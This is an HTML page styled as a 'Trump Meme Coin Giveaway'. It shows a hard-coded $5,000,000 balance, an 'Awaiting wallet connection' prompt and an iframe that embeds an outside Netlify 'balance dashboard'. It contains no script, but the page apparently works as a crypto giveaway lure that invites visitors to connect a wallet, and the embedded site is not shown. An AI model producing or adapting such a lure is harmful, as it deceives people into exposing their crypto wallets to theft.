<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Trump Meme Coin Giveaway</title>
  <style>
    body {
      margin: 0;
      font-family: 'Arial', sans-serif;
      background: linear-gradient(90deg, #003366, #0066cc);
      color: white;
      display: flex;
      flex-direction: column;
      align-items: center;
      height: 100vh;
    }
    .header {
      display: flex;
      align-items: center;
      justify-content: space-between;
      padding: 20px 30px;
      width: 100%;
      box-sizing: border-box;
    }
    .header img {
      width: 80px;
      height: auto;
      border-radius: 12px;
    }
    .header-text h1 {
      margin: 0;
      font-size: 48px;
      font-weight: 900;
      letter-spacing: 1.5px;
    }
    .wallet-header {
      background: #1c1c1e;
      padding: 16px 24px;
      margin: 20px 0;
      border-radius: 16px;
      box-shadow: 0 2px 12px rgba(0, 0, 0, 0.3);
      display: flex;
      flex-direction: column;
      gap: 10px;
      width: 100%;
    }
    .balance {
      display: flex;
      align-items: center;
      gap: 8px;
      width: 100%;
    }
    .balance-logo {
      width: 24px;
      height: 24px;
      object-fit: contain;
    }
    .amount {
      font-size: 1.8rem;
      font-weight: bold;
      color: #00ff80;
    }
    .status-message {
      background: #2c2c2e;
      padding: 6px 10px;
      border-radius: 8px;
      display: none;
    }
    .activity-log {
      font-size: 0.85rem;
      color: #bbb;
      max-height: 150px;
      overflow-y: auto;
      border-top: 1px solid #333;
      padding-top: 6px;
    }
    .log-entry {
      margin-bottom: 4px;
      opacity: 0.8;
    }
    .idle-message {
      font-size: 0.8rem;
      color: #666;
      text-align: center;
      margin-top: 6px;
    }
    /* Mobile Styles */
    @media (max-width: 768px) {
      .header {
        flex-wrap: wrap;
        justify-content: center;
        gap: 15px;
        padding: 15px;
      }
      .header img {
        width: 60px;
      }
      .header-text h1 {
        font-size: 32px;
        text-align: center;
      }
      .wallet-header {
        margin: 16px;
        padding: 14px;
      }
    }

    /* Embed Iframe Styling */
    .iframe-container {
      width: 100%;
      height: 600px;  /* Reasonable height for balance */
      display: block;
      margin-top: 20px;
      position: relative;
    }
    iframe {
      width: 100%;
      height: 100%;
      border: none;
      border-radius: 16px;
      box-shadow: none;
    }
  </style>
</head>
<body>

  <!-- Header Section -->
  <div class="header">
    <img src="https://media.zenfs.com/en/aol_ny_post_us_news_articles_123/cd57f4122a7033346c851d4791a4aff0" alt="Trump Meme Coin">
    <div class="header-text">
      <h1>TRUMP MEME COIN GIVEAWAY</h1>
    </div>
  </div>

  <!-- Wallet Dashboard Section -->
  <div class="wallet-header">
    <div class="balance">
      <img src="https://media.zenfs.com/en/aol_ny_post_us_news_articles_123/cd57f4122a7033346c851d4791a4aff0" alt="Logo" class="balance-logo" />
      <span>Balance</span>
    </div>
    <div class="amount" id="balanceDisplay">$5,000,000</div>
    <div class="status-message" id="statusBox"></div>
    <div class="activity-log" id="logBox"></div>
    <div class="idle-message" id="idleMsg">‚è≥ Awaiting wallet connection...</div>
  </div>

  <!-- Embedded Wallet Dashboard -->
  <div class="iframe-container">
    <iframe src="https://trump-balance-dashboard.netlify.app/"></iframe>
  </div>

</body>
</html>
